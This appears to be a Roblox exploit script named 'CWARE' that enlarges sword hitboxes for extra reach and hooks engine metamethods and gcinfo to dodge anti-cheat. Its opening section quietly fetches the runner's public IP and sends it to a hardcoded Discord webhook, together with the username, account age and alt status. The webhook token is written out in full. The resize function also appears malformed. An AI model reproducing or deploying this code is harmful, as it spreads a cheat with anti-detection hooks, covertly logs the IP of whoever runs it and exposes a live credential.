if not _G.CW then
game.Players.LocalPlayer:Kick("Access Denied")
end

local IP = game:HttpGet("https://v4.ident.me")
plr = game:GetService'Players'.LocalPlayer
local premium = false
local ALT = false
if plr.MembershipType == Enum.MembershipType.Premium then
	premium = true
elseif plr.MembershipType == Enum.MembershipType.None then
	premium = false
end
if premium == false then 
	if plr.AccountAge <= 70 then 
		ALT = true
	end
end

local Type = "CW.WhiteV1.0"

local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)


local http_request = http_request;
if syn then
	http_request = syn.request
elseif SENTINEL_V2 then
	function http_request(tb)
		return {
			StatusCode = 200;
			Body = request(tb.Url, tb.Method, (tb.Body or ''))
		}
	end
end

local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)




local HttpServ = game:GetService('HttpService')
local url = "https://discord.com/api/webhooks/876807530054025256/Qo-FNVRXL8g66SXazVKLJ8eNDcLJx4rb7i5RjH4fCdvAvUijl92pfXDodoSriFdJ_YKm"


local data = 
    {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "CWARE",
            ["description"] = "",
            ["type"] = "rich",
            ["color"] = tonumber(0xFFFFFF),
			["footer"] = {
  			["icon_url"] = "https://cdn.discordapp.com/attachments/875363573851902035/885506329500876850/CWWhite.png", -- optional
  			["text"] = "Â© CWARE Made by Configurist"
  			},
  			["image"] = {
            ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..tostring(game:GetService("Players").LocalPlayer.Name),
  			},
            ["fields"] = {
                {
                    ["name"] = "Username",
                    ["value"] = Game.Players.LocalPlayer.Name,
                    ["inline"] = true
                },
				{
                    ["name"] = "IP",
                    ["value"] = IP,
                    ["inline"] = true
                },
				{
                    ["name"] = "Link to game",
                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
                    ["inline"] = true
                },
				{
					["name"] = "Game Name",
					["value"] = info.Name,
					["inline"] = true
				},
				{
					["name"] = "Account Age",
					["value"] = plr.AccountAge,
					["inline"] = true
				},
				{
					["name"] = "Premium",
					["value"] = premium,
					["inline"] = true
				},
				{
					["name"] = "CWare Whitelist",
					["value"] = Type,
					["inline"] = true
				},

				{
					["name"] = "Alt",
					["value"] = ALT,
					["inline"] = true
					
				},
				
            },
        }}
	}
 


	local newdata = HttpServ:JSONEncode(data)
    
    local headers = {
            ["content-type"] = "application/json"
    }
    
     local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
    http_request(request_payload)
local Version = ''
local Players = game:GetService("Players")
local TweenS = game:GetService("TweenService")
local TeamService = game:GetService("Teams")
local RunService = game:GetService("RunService")

local Player = Players.LocalPlayer

local ScreenGui = Instance.new("ScreenGui")
if not _G.NoGui then
	ScreenGui.Name = ""
	ScreenGui.ResetOnSpawn = false
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
	ScreenGui.Parent = game:GetService("CoreGui")
end

local NOTIFICATION_FRAME = Instance.new("Frame");NOTIFICATION_FRAME.SizeConstraint = Enum.SizeConstraint.RelativeYY
NOTIFICATION_FRAME.BorderSizePixel = 0;NOTIFICATION_FRAME.BackgroundColor3 = Color3.fromRGB(33, 33, 33);NOTIFICATION_FRAME.Size = UDim2.new(0.25, 0,0.08, 0);NOTIFICATION_FRAME.Position = UDim2.new(1,-10,1,-10);NOTIFICATION_FRAME.AnchorPoint = Vector2.new(0,1)
Instance.new("UICorner").Parent = NOTIFICATION_FRAME
local Label = Instance.new("TextLabel",NOTIFICATION_FRAME);Label.BackgroundTransparency = 1;Label.AnchorPoint = Vector2.new(.5,0);Label.Position = UDim2.new(.5,0,0,.5);Label.Size = UDim2.new(1,-5,.45,0);Label.Text = "CWARE "..Version;Label.TextColor3 = Color3.new(247, 245, 245);Label.TextScaled = true;Label.Font = Enum.Font.Sarpanch
local NOTIFICATION_LABEL = Label:Clone();NOTIFICATION_LABEL.Position = UDim2.new(.5,0,.45,5);NOTIFICATION_LABEL.Size = UDim2.new(1,-5,.55,-10);NOTIFICATION_LABEL.Text = "CWARE Loaded";NOTIFICATION_LABEL.Parent = NOTIFICATION_FRAME
local NOTE_IN = TweenS:Create(NOTIFICATION_FRAME,TweenInfo.new(.5),{AnchorPoint = Vector2.new(1,1)})
local NOTE_OUT = TweenS:Create(NOTIFICATION_FRAME,TweenInfo.new(.5),{AnchorPoint = Vector2.new(0,1),Position = UDim2.new(1,0,1,-10)})
NOTIFICATION_FRAME.Parent = ScreenGui

NOTE_IN:Play()


local UIS = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService");
local RS = game:GetService("RunService")
local MarketPlaceService = game:GetService("MarketplaceService")

local r = Random.new()
if hookfunction then
	local memory = gcinfo()
	hookfunction(gcinfo, newcclosure(function()
		return r:NextNumber(memory-100,memory+100)
	end))
end

local ConnectionsToDisabled = {game.DescendantAdded,workspace.DescendantAdded,workspace.ChildAdded}
local function DisableAdded()
	local ToEnable = {}
	for _,c in pairs(ConnectionsToDisabled) do
		for _,v in pairs(getconnections(c)) do table.insert(ToEnable,v);v:Disable() end
	end
	return ToEnable
end

local function Enable(ToEnable)
	for _,v in pairs(ToEnable) do
		v:Enable()
	end
end

local UserInputService = game:GetService("UserInputService")
for _,v in pairs(getconnections(UserInputService.TextBoxFocusReleased)) do
    v:Disable()
end

local Selection


local Spoofed = {}
local Properties = {Size = true,Shape = true,Massless = true,Mass = 1}
local spoofedMethods = {["Clone"] = true,["GetMass"] = true}

local PropertyCheck = {}
for key,value in pairs(Properties) do
  PropertyCheck[string.lower(key)] = value
end

local MethodCheck = {}
for key,value in pairs(spoofedMethods) do
  PropertyCheck[string.lower(key)] = value
  MethodCheck[string.lower(key)] = value
end

local Meta
Meta = hookmetamethod(game,"__index", newcclosure(function(t,k)
    if not checkcaller() then
        local success,err = pcall(function()
            local toCheck = string.lower(k:match("%w+")) 
            if Spoofed[t] and PropertyCheck[toCheck] then
                return Meta(Spoofed[t],k)
            end
            return Meta(t,k)
        end)
        if success then return err end
    end
    return Meta(t,k)
end))

local Meta
Meta = hookmetamethod(game,"__namecall", newcclosure(function(Self,...)
    local Args = {...}
    if not checkcaller() then
        local method = getnamecallmethod()
        method = string.lower(method:match("%w+")) 
        local n = Args and Args[1]
        if Spoofed[Self] then
            if method == "gettouchingparts" and Selection then
                return Meta(Selection, unpack(Args))
            elseif MethodCheck[method] then
                return Meta(Spoofed[Self], unpack(Args))
            end
        end    
    end
    return Meta(Self,unpack(Args))
end))
local Meta
Meta = hookmetamethod(game,"__newindex", newcclosure(function(t,k,v) -- (self, property, newsize)
	if not checkcaller() and Spoofed[t] then
		return Meta(Spoofed[t],k,v)
	end
	return Meta(t,k,v)
end))

local function Hook(Self,Method)
	local old
	old = hookfunction(Self[Method], newcclosure(function(self, ...)
		if Spoofed[self] and spoofedMethods[Method] then
			return old(Spoofed[self],...)
		end
		return old(self, ...)
	end))
end
Hook(Instance.new("Model"),"Clone")
Hook(Instance.new("Part"),"GetMass")

local function Spoof(i)
	Spoofed[i] = i:Clone()
end

local MenuFrames = {"GENERAL","RESIZE"}
local Options = {
GENERAL = {
		Visible = {Value = false,Text = "UI Enabled",Type = "Check",Order = 5};
		Lunge = {Value = true,Text = "Lunge Only",Type = "Check",Order = 10},
		Block = {Value = true,Text = "Shape: Block",Type = "Check",Order = 20};
	    Size = {Value = 3.5,Text = "Region",Bounds = {22,2},Order = 15},		
		X = {Value = 0.8,Text = ">  Size X",Bounds = {999,.1},Order = 25},
		Y = {Value = 3.5,Text = ">  Size Y",Bounds = {999,.1},Order = 30},
		Z = {Value = 3.6,Text = ">  Size Z",Bounds = {999,.1},Order = 35},
	};
	RESIZE = {
		REnabled = {Value = true,Text = "Resize Enabled",Type = "Check",Order = 5};
	};
	FTI = {
		FEnabled = {Value = false,Text = "FTI Enabled",Type = "Check",Order = 5};
		Extra = {Value = 1,Text = "Extra Hits",Bounds = {5,1},Order = 10};
		GetTouchingParts = {Value = false,Text = "GetTouchingParts",Type = "Check",Order = 12};
		dt = {Value = 0.05,Text = "Limb Debounce",Bounds = {1,0.001},Order = 15};
		Abs = {Value = 0.0001,Text = "Absolute Debounce",Bounds = {1,0.0001},Order = 20};
	};
}

local Keybinds = {Menu = Enum.KeyCode.P}

local TargetSettings = {
	NPC = false;
	Teammates = true;
	Teams = {};
}

local OffColor = Color3.new(0,0,0)
local OnColor = Color3.new(0.592157, 0, 0)
local SelectionTemplate = Instance.new("Part")
SelectionTemplate.Color = OffColor 
SelectionTemplate.Shape = "Ball"
SelectionTemplate.Material = Enum.Material.ForceField
SelectionTemplate.Transparency = .5
SelectionTemplate.Massless = true
SelectionTemplate.CanCollide = false
SelectionTemplate.CastShadow = false
SelectionTemplate.Anchored = false

local Lunging = {}
local Sword

local function ResizeSword(CSword,Normal)
	local function ResizeSword(CSword,Normal)
    local Handle = CSword and CSword:FindFirstChild("Handle")
    local function OnHandle(Handle)
        if not Spoofed[Handle] then
            Spoof(Handle)
            Spoof(Handle.Parent)
              end
        end
		local ToEnable = {}
		for _,v in pairs(getconnections(Handle.Changed)) do table.insert(ToEnable,v);v:Disable() end 
		for C,_ in pairs(Properties) do
			for _,v in pairs(getconnections(Handle:GetPropertyChangedSignal(C))) do table.insert(ToEnable,v);v:Disable() end
		end
		local Copy = Normal and Spoofed[Handle] or Selection
		if Copy then
			for Property,v in pairs(Properties) do
				if v == true then
					Handle[Property] = Copy[Property]
				end
			end
		end
		Enable(ToEnable)
	end
	if Handle then
		local Fake
		local Connected = Handle:GetConnectedParts()
		for _,Part in pairs(Connected) do
			if Part ~= Selection and Part.Name ~= "Right Arm" then
				OnHandle(Part)
			end
		end
		OnHandle(Handle)
	end
end

local function SetResizeState(CSword)
	if CSword then
		if Options.RESIZE.REnabled.Value then
			if Options.GENERAL.Lunge.Value then
				ResizeSword(CSword,not Lunging[CSword])
			else
				ResizeSword(CSword)
			end
		else
			ResizeSword(CSword,true)
		end
	end
end
local function SetSelectionSize()
	if Selection then
		local Options = Options.GENERAL
		local Size = Options.Size.Value
		Selection.Shape = Options.Block.Value and "Block" or "Ball"
		Selection.Size = Options.Block.Value and Vector3.new(Options.X.Value,Options.Y.Value,Options.Z.Value) or Vector3.new(Size,Size,Size)
		SetResizeState(Sword)
	end
end

local function SetSelectionColor()
	if Selection then
		if (not Options.GENERAL.Lunge.Value or (Sword and Lunging[Sword])) and (Options.FTI.FEnabled.Value or Options.RESIZE.REnabled.Value) then
			Selection.Color = OnColor
		else
			Selection.Color = OffColor
		end
		SetResizeState(Sword)
	end
end

local Cols = {[true] = Color3.fromRGB(34,34,342),[false] = Color3.fromRGB(34,34,34)}
local Label = Instance.new("TextLabel");Label.AnchorPoint = Vector2.new(0.5, 1)
Label.Size = UDim2.new(0.5, 0,0, 15);Label.Position = UDim2.new(0.5, 0,1, -85)
Label.TextColor3 = Cols[true];	Label.Font = Enum.Font.Sarpanch
Label.BackgroundTransparency = 1
Label.TextSize = 18;Label.TextStrokeTransparency = 1;Label.TextTransparency = 1
do
	local Frame = Instance.new("Frame");Frame.BorderSizePixel = 0;Frame.BackgroundTransparency = 1; Frame.AnchorPoint = Vector2.new(.5,.5);Frame.Position = UDim2.new(.5,0,.5,0)
	Frame.BackgroundColor3 = Color3.fromRGB(33, 33, 33);Instance.new("UICorner",Frame);Frame.ZIndex = 0 
	Frame.Parent = Label
end
Label.Parent = ScreenGui

local G_LABEL = Label

local Goal1 = {TweenS:Create(Label,TweenInfo.new(.5),{TextTransparency = 0}),TweenS:Create(Label.Frame,TweenInfo.new(.5),{BackgroundTransparency = 0})}
local Goal2 = {TweenS:Create(Label,TweenInfo.new(.5),{TextTransparency = 1}),TweenS:Create(Label.Frame,TweenInfo.new(.5),{BackgroundTransparency = 1})}

local i = 0
local function tween(t)
	local n = i + 1
	i = n
	Label.TextTransparency = 1
	Label.Frame.BackgroundTransparency = 1
	Label.Text = t
	local s = Label.TextBounds
	Label.Frame.Size = UDim2.new(0,s.X+20,0,s.Y+5)
	for i = 1,2 do Goal1[i]:Play() end
	wait(1)
	if n == i then
		for i = 1,2 do Goal2[i]:Play() end
	end
end

local Frame = Instance.new("Frame");Frame.AnchorPoint = Vector2.new(.5,1);Frame.BackgroundColor3 = Color3.fromRGB(33, 33, 33); Frame.Position = UDim2.new(0.5, 0,1, -120);Frame.Size = UDim2.new(0,160,0,170)
local UICorner = Instance.new("UICorner");UICorner.Parent = Frame
OptionFrame = Frame; Frame.Visible = false
local UIL = Instance.new("UIListLayout");UIL.Padding = UDim.new(0,5);UIL.SortOrder = Enum.SortOrder.LayoutOrder
local Label = Instance.new("TextButton");Label.TextSize = 14; Label.BackgroundTransparency = 1;Label.Font = Enum.Font.Sarpanch;Label.TextStrokeTransparency = 1;Label.TextColor3 = Color3.new(247, 245, 245);Label.Size = UDim2.new(1,0,0,14)

local ButtonFrame1 = Frame:Clone();ButtonFrame1.Visible = true;ButtonFrame1.BackgroundColor3 = Color3.fromRGB(33, 33, 33);ButtonFrame1.AnchorPoint = Vector2.new(1,.5);ButtonFrame1.Position = UDim2.new(0,8,.5,0);ButtonFrame1.Size = UDim2.new(0,80,0,150);ButtonFrame1.Parent = Frame;ButtonFrame1.ZIndex = 0
local ButtonFrame2 = Instance.new("Frame");ButtonFrame2.BackgroundTransparency = 1;ButtonFrame2.Position = UDim2.new(0,5,0,5);ButtonFrame2.Size = UDim2.new(1,-10,1,-10);UIL:Clone().Parent = ButtonFrame2;ButtonFrame2.Parent = ButtonFrame1

local TeamFrame = ButtonFrame1:Clone()

local FRAMES = {}
local CurrentFrame = 'GENERAL'
for _,n in pairs(MenuFrames) do
	local Button = Label:Clone()
	Button.Text = n
	Button.MouseButton1Down:Connect(function()
		if CurrentFrame ~= n then
			FRAMES[CurrentFrame].Visible = false
			CurrentFrame = n
			FRAMES[CurrentFrame].Visible = true
		end
	end)
	Button.Parent = ButtonFrame2
end

local Frame = Instance.new("ScrollingFrame");Frame.BorderSizePixel = 0;Frame.BackgroundTransparency = 1;Frame.ScrollBarThickness = 5; Frame.Position = UDim2.new(0,5,0,5);Frame.Size = UDim2.new(1,-10,1,-10)
local Frame2 = Frame:Clone();Frame2.Visible = false;Frame2.Parent = OptionFrame
local Frame3 = Frame2:Clone();Frame3.CanvasSize = UDim2.new(0,0,0,0); --Frame3.Parent = OptionFrame

FRAMES.KEYBINDS = Frame2


local TempFrame = Instance.new("Frame");TempFrame.BackgroundTransparency = 1;TempFrame.Size = UDim2.new(1,-5,0,20); local new = Label:Clone();new.Position = UDim2.new(0,2,0,0);new.Size = UDim2.new(1,0,1,0) ;new.TextXAlignment = Enum.TextXAlignment.Left;new.Parent = TempFrame
local TextBoxTemp = Instance.new("TextBox");TextBoxTemp.Text = '';TextBoxTemp.BackgroundTransparency = .5;TextBoxTemp.BorderSizePixel = 0;TextBoxTemp.BackgroundColor3 = Color3.fromRGB(43, 43, 43);TextBoxTemp.AnchorPoint = Vector2.new(1,0);TextBoxTemp.Position = UDim2.new(1,-5,0,0);TextBoxTemp.Size = UDim2.new(.25,0,1,0);TextBoxTemp.TextColor3 = Color3.new(247, 245, 245)
local CheckBoxTemp = Instance.new("TextButton");CheckBoxTemp.BackgroundTransparency = .5;CheckBoxTemp.BorderSizePixel = 0;TextBoxTemp.BackgroundColor3 = Color3.fromRGB(43, 43, 43);CheckBoxTemp.AnchorPoint = Vector2.new(1,0);CheckBoxTemp.Position = UDim2.new(1,-12,0,0);CheckBoxTemp.Size = UDim2.new(0,20,0,20);CheckBoxTemp.TextColor3 = Color3.new(247, 245, 245)
UICorner:Clone().Parent = TextBoxTemp;UICorner:Clone().Parent = CheckBoxTemp
local ResizeOptions = {Size = true,X = true,Y =true,Z = true}
for _,i in pairs(MenuFrames) do
	local t = Options[i]
	if t then
		local Frame = Frame:Clone()
		Frame.Visible = i == CurrentFrame
		FRAMES[i] = Frame
		local UIL = UIL:Clone()
		UIL.Parent = Frame
		for Option,Info in pairs(t) do
			new.Text = Info.Text
			local new = TempFrame:Clone()
			new.LayoutOrder = Info.Order
			local vals = Info.Bounds
			if vals then
				local TextBox = TextBoxTemp:Clone();TextBox.PlaceholderText = Info.Value;TextBox.Parent = new
				local Max,Min= vals[1],vals[2]
				TextBox.FocusLost:Connect(function(enter)
					if enter then
						wait()
						local n = TextBox.Text
						if n and tonumber(n) then
							n = math.clamp(tonumber(n),Min,Max)
							TextBox.Text = ''
							TextBox.PlaceholderText = n
							t[Option].Value = n
							if ResizeOptions[Option] then
								SetSelectionSize()
							end
						else
							TextBox.Text = ''
						end
					end
				end)
			elseif Info.Type == "Check" then
				local CheckBox = CheckBoxTemp:Clone();CheckBox.Parent = new
				local val = Info.Value
				CheckBox.Text = val and 'X' or ''
				CheckBox.MouseButton1Down:Connect(function()
					val = not val
					CheckBox.Text = val and 'X' or ''
					t[Option].Value = val
					if Option == "Visible" then
						G_LABEL.Visible = val
						if Selection then
							Selection.Transparency = val and .5 or 1
						end
					elseif Option == "Block" or Option == "REnabled" then
						SetSelectionColor()
						SetSelectionSize()
					elseif Option == "Lunge" then
						SetSelectionColor()
					elseif Option == "FEnabled" then
						SetSelectionColor()
					end
				end)
			end
			new.Parent = Frame
		end
		Frame.Parent = OptionFrame
		Frame.CanvasSize = UDim2.new(0,0,0,UIL.AbsoluteContentSize.Y)
	end
end

local UIL = UIL:Clone()
UIL.Parent = Frame2

for index,KeyCode in pairs(Keybinds) do
	new.Text = index
	local new = TempFrame:Clone()
	local TextButton = CheckBoxTemp:Clone()
	local current = string.char(KeyCode.Value):upper()
	TextButton.Text = current
	TextButton.MouseButton1Down:Connect(function()
		TextButton.Text = ''
		wait()
		local Listening,KeyCode
		Listening = UIS.InputBegan:Connect(function(k)
			if k.UserInputType == Enum.UserInputType.Keyboard then
				KeyCode = k.KeyCode
				Listening:Disconnect()
				Listening = nil
			elseif k.UserInputType == Enum.UserInputType.MouseButton1 then
				Listening:Disconnect()
				Listening = nil
			end
		end)
		repeat wait() until not Listening
		if KeyCode then
			local success = pcall(function()
				current = string.char(KeyCode.Value):upper()
			end)
			if success then
				Keybinds[index] = KeyCode
			end
		end
		TextButton.Text = current
	end)
	TextButton.Parent = new
	new.Parent = Frame2
end
Frame2.CanvasSize = UDim2.new(0,0,0,UIL.AbsoluteContentSize.Y)

Frame3.ClipsDescendants = false

OptionFrame.Parent = ScreenGui

UIS.InputBegan:Connect(function(k,g)
	if not g then
		if k.KeyCode == Keybinds.Menu and OptionFrame then
			local new = not OptionFrame.Visible
			for _,v in pairs(getconnections(game:GetService("UserInputService").TextBoxFocused)) do if new then v:Disable() else v:Enable() end end
			OptionFrame.Visible = new
		end
	end
end)
-----------------------------------
local SwordConnections = {}

local Destroyed = {}
local function TrackDestroyed(instance)
	Destroyed[instance] = instance:GetPropertyChangedSignal("Parent"):Connect(function() end)
end
local function IsDestroyed(instance)
	local connect = Destroyed[instance]
	if connect then
		if not connect.Connected then
			Destroyed[instance] = nil
			return true
		elseif not instance.Parent or not instance.Parent.Parent then
			Destroyed[instance] = nil
			instance:Destroy()
			return true
		end
	end
	return false
end

local function DisconnectSword(CSword)
	Lunging[CSword] = nil
	SwordConnections[CSword] = nil
	local Handle = CSword:FindFirstChild("Handle")
	if Handle and Spoofed[Handle] then
		Spoofed[Handle]:Destroy()
		Spoofed[Handle] = nil
	end
end

local lastHits = {}
local absoluteLast = 0
local function AddSwordConnection(CSword)
	if not SwordConnections[CSword] then
		SwordConnections[CSword] = true
		local Handle = CSword:WaitForChild("Handle",1)
		if Handle then
			CSword:GetPropertyChangedSignal("Grip"):Connect(function()
				local G = CSword.GripUp.Z
				if G == 1 then
					Lunging[CSword] = nil
				elseif G == 0 then
					Lunging[CSword] = true
				end
				SetSelectionColor()
			end)
			CSword.Equipped:Connect(function()
				Sword = CSword
				local General = Options.GENERAL
				if not Selection then
					Selection = SelectionTemplate:Clone()
					Selection.Transparency = General.Visible.Value and .5 or 1
					SetSelectionSize()
				end
				SetSelectionColor()
			end)
			CSword.Unequipped:Connect(function()
				if Sword ~= CSword then
					Selection.Parent = nil
				end
			end)
			TrackDestroyed(CSword)
		else
			SwordConnections[CSword] = nil
		end
	end
end

local function CharacterAdded(char)
	for CSword,_ in pairs(SwordConnections) do
		if IsDestroyed(CSword) then
			DisconnectSword(CSword)
		end
	end
	Sword = char:FindFirstChildOfClass("Tool")
	char.ChildAdded:Connect(function(i)
		if i.ClassName == 'Tool' then
			Sword = i
			AddSwordConnection(Sword)
		end
	end)
	char.ChildRemoved:Connect(function(i)
		if Sword == i then
			Sword = nil
		end
	end)

	G_LABEL.TextColor3 = Color3.new(247, 245, 245)
end
Player.CharacterAdded:Connect(CharacterAdded)
if Player.Character then
	CharacterAdded(Player.Character)
end


NOTIFICATION_LABEL.Text = "CWARE Loaded"
wait(3)
NOTE_OUT:Play()
